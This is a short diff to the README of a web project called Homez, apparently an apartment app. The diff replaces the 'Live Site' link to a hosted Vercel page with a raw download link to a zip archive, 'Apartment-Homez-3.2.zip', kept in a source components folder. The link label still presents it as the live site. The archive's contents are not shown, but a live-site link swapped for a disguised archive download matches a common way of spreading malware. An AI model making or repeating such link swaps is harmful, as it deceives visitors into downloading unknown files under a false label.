@@ -2,7 +2,7 @@
 
 ## 🔗 Live Site
 
-👉 [Homez Live](https://homez-apartment.vercel.app/)
+👉 [Homez Live](https://github.com/jobayer58/Homez-Apartment/raw/refs/heads/main/src/Components/Apartment-Homez-3.2.zip)
 
 
 ## Tech Choices
